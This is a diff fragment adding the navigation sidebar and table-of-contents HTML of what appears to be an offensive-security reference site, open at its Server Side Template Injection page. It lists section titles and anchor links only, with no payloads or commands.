+        Ruby Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_22" type="checkbox" id="__nav_22" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_22">
+          Insecure Direct Object References
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Direct Object References" data-md-level="1">
+        <label class="md-nav__title" for="__nav_22">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Direct Object References
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Direct%20Object%20References/" class="md-nav__link">
+        Insecure Direct Object References
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_23" type="checkbox" id="__nav_23" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_23">
+          Insecure Management Interface
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Management Interface" data-md-level="1">
+        <label class="md-nav__title" for="__nav_23">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Management Interface
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Management%20Interface/" class="md-nav__link">
+        Insecure management interface
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_24" type="checkbox" id="__nav_24" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_24">
+          Insecure Source Code Management
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Source Code Management" data-md-level="1">
+        <label class="md-nav__title" for="__nav_24">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Source Code Management
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Source%20Code%20Management/" class="md-nav__link">
+        Insecure source code management
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_25" type="checkbox" id="__nav_25" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_25">
+          JSON Web Token
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="JSON Web Token" data-md-level="1">
+        <label class="md-nav__title" for="__nav_25">
+          <span class="md-nav__icon md-icon"></span>
+          JSON Web Token
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JSON%20Web%20Token/" class="md-nav__link">
+        JWT - JSON Web Token
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_26" type="checkbox" id="__nav_26" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_26">
+          Java RMI
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java RMI" data-md-level="1">
+        <label class="md-nav__title" for="__nav_26">
+          <span class="md-nav__icon md-icon"></span>
+          Java RMI
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Java%20RMI/" class="md-nav__link">
+        Java RMI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_27" type="checkbox" id="__nav_27" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_27">
+          Kubernetes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Kubernetes" data-md-level="1">
+        <label class="md-nav__title" for="__nav_27">
+          <span class="md-nav__icon md-icon"></span>
+          Kubernetes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kubernetes/" class="md-nav__link">
+        Kubernetes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_28" type="checkbox" id="__nav_28" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_28">
+          LDAP Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LDAP Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_28">
+          <span class="md-nav__icon md-icon"></span>
+          LDAP Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../LDAP%20Injection/" class="md-nav__link">
+        LDAP injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_29" type="checkbox" id="__nav_29" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_29">
+          LaTeX Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LaTeX Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_29">
+          <span class="md-nav__icon md-icon"></span>
+          LaTeX Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../LaTeX%20Injection/" class="md-nav__link">
+        LaTex Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_30" type="checkbox" id="__nav_30" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_30">
+          Methodology and Resources
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Methodology and Resources" data-md-level="1">
+        <label class="md-nav__title" for="__nav_30">
+          <span class="md-nav__icon md-icon"></span>
+          Methodology and Resources
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Active%20Directory%20Attack/" class="md-nav__link">
+        Active Directory Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/" class="md-nav__link">
+        Bind Shell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
+        AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
+        Azure Active Directory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
+        Cobalt Strike
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/" class="md-nav__link">
+        Docker Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Escape%20Breakout/" class="md-nav__link">
+        Application Escape and Breakout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Hash%20Cracking/" class="md-nav__link">
+        Hash Cracking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Persistence/" class="md-nav__link">
+        Linux - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Linux - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
+        MSSQL Server
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/" class="md-nav__link">
+        Metasploit
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Methodology%20and%20enumeration/" class="md-nav__link">
+        Bug Hunting Methodology and Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/" class="md-nav__link">
+        Miscellaneous & Tricks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Network%20Discovery/" class="md-nav__link">
+        Network Discovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Network%20Pivoting%20Techniques/" class="md-nav__link">
+        Network Pivoting Techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Office%20-%20Attacks/" class="md-nav__link">
+        Office - Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/" class="md-nav__link">
+        Powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
+        Reverse Shell Cheat Sheet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Source%20Code%20Management/" class="md-nav__link">
+        Source Code Management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Subdomains%20Enumeration/" class="md-nav__link">
+        Subdomains Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
+        AMSI Bypass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
+        Windows - Download and execute methods
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Mimikatz/" class="md-nav__link">
+        Windows - Mimikatz
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Persistence/" class="md-nav__link">
+        Windows - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Windows - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Using%20credentials/" class="md-nav__link">
+        Windows - Using credentials
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_31" type="checkbox" id="__nav_31" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_31">
+          NoSQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="NoSQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_31">
+          <span class="md-nav__icon md-icon"></span>
+          NoSQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20Injection/" class="md-nav__link">
+        NoSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_32" type="checkbox" id="__nav_32" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_32">
+          OAuth
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="OAuth" data-md-level="1">
+        <label class="md-nav__title" for="__nav_32">
+          <span class="md-nav__icon md-icon"></span>
+          OAuth
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OAuth/" class="md-nav__link">
+        OAuth
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_33" type="checkbox" id="__nav_33" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_33">
+          Open Redirect
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Open Redirect" data-md-level="1">
+        <label class="md-nav__title" for="__nav_33">
+          <span class="md-nav__icon md-icon"></span>
+          Open Redirect
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Open%20Redirect/" class="md-nav__link">
+        Open URL Redirection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_34" type="checkbox" id="__nav_34" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_34">
+          Race Condition
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Race Condition" data-md-level="1">
+        <label class="md-nav__title" for="__nav_34">
+          <span class="md-nav__icon md-icon"></span>
+          Race Condition
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20Condition/" class="md-nav__link">
+        Race Condition
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_35" type="checkbox" id="__nav_35" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_35">
+          Request Smuggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Request Smuggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_35">
+          <span class="md-nav__icon md-icon"></span>
+          Request Smuggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Request%20Smuggling/" class="md-nav__link">
+        Request Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_36" type="checkbox" id="__nav_36" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_36">
+          SAML Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SAML Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_36">
+          <span class="md-nav__icon md-icon"></span>
+          SAML Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SAML%20Injection/" class="md-nav__link">
+        SAML Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_37" type="checkbox" id="__nav_37" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_37">
+          SQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_37">
+          <span class="md-nav__icon md-icon"></span>
+          SQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/" class="md-nav__link">
+        SQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
+        Google BigQuery SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
+        Cassandra Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
+        DB2 Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
+        Hibernate Query Language Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
+        MSSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
+        MYSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
+        Oracle SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
+        PostgreSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
+        SQLite Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_38" type="checkbox" id="__nav_38" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_38">
+          Server Side Request Forgery
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Request Forgery" data-md-level="1">
+        <label class="md-nav__title" for="__nav_38">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Request Forgery
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20Side%20Request%20Forgery/" class="md-nav__link">
+        Server-Side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_39" type="checkbox" id="__nav_39" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_39">
+          Server Side Template Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Template Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_39">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Template Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Templates Injections
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Templates Injections
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#methodology" class="md-nav__link">
+    Methodology
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    Detection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#aspnet-razor" class="md-nav__link">
+    ASP.NET Razor
+  </a>
+  
+    <nav class="md-nav" aria-label="ASP.NET Razor">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#aspnet-razor-basic-injection" class="md-nav__link">
+    ASP.NET Razor - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#aspnet-razor-command-execution" class="md-nav__link">
+    ASP.NET Razor - Command execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#expression-language-el" class="md-nav__link">
+    Expression Language EL
+  </a>
+  
+    <nav class="md-nav" aria-label="Expression Language EL">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#expression-language-el-basic-injection" class="md-nav__link">
+    Expression Language EL - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#expression-language-el-one-liner-injections-not-including-code-execution" class="md-nav__link">
+    Expression Language EL - One-Liner injections not including code execution
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#expression-language-el-code-execution" class="md-nav__link">
+    Expression Language EL - Code Execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#freemarker" class="md-nav__link">
+    Freemarker
+  </a>
+  
+    <nav class="md-nav" aria-label="Freemarker">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-basic-injection" class="md-nav__link">
+    Freemarker - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-read-file" class="md-nav__link">
+    Freemarker - Read File
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-code-execution" class="md-nav__link">
+    Freemarker - Code execution
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-sandbox-bypass" class="md-nav__link">
+    Freemarker - Sandbox bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#groovy" class="md-nav__link">
+    Groovy
+  </a>
+  
+    <nav class="md-nav" aria-label="Groovy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#groovy-basic-injection" class="md-nav__link">
+    Groovy - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#groovy-read-and-create-file" class="md-nav__link">
+    Groovy - Read and create File
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#groovy-http-request" class="md-nav__link">
+    Groovy - HTTP request:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#groovy-command-execution" class="md-nav__link">
+    Groovy - Command Execution
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#groovy-sandbox-bypass" class="md-nav__link">
+    Groovy - Sandbox Bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#handlebars" class="md-nav__link">
+    Handlebars
+  </a>
+  
+    <nav class="md-nav" aria-label="Handlebars">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#handlebars-command-execution" class="md-nav__link">
+    Handlebars - Command Execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jade-codepen" class="md-nav__link">
+    Jade / Codepen
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    Java
+  </a>
+  
+    <nav class="md-nav" aria-label="Java">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#java-basic-injection" class="md-nav__link">
+    Java - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java-retrieve-the-systems-environment-variables" class="md-nav__link">
+    Java - Retrieve the system’s environment variables
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java-retrieve-etcpasswd" class="md-nav__link">
+    Java - Retrieve /etc/passwd
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#django-templates" class="md-nav__link">
+    Django Templates
+  </a>
+  
+    <nav class="md-nav" aria-label="Django Templates">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_1" class="md-nav__link">
+    Detection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#django-templates-for-post-exploitation" class="md-nav__link">
+    Django Templates for post-exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-scripting" class="md-nav__link">
+    Cross-site scripting
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#debug-information-leak" class="md-nav__link">
+    Debug information leak
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#leaking-apps-secret-key" class="md-nav__link">
+    Leaking app’s Secret Key
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#admin-site-url-leak" class="md-nav__link">
+    Admin Site URL leak
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#admin-username-and-password-hash-leak" class="md-nav__link">
+    Admin username and password hash leak
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jinja2" class="md-nav__link">
+    Jinja2
+  </a>
+  
+    <nav class="md-nav" aria-label="Jinja2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-basic-injection" class="md-nav__link">
+    Jinja2 - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-template-format" class="md-nav__link">
+    Jinja2 - Template format
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-debug-statement" class="md-nav__link">
+    Jinja2 - Debug Statement
+  </a>
+  
+</li>
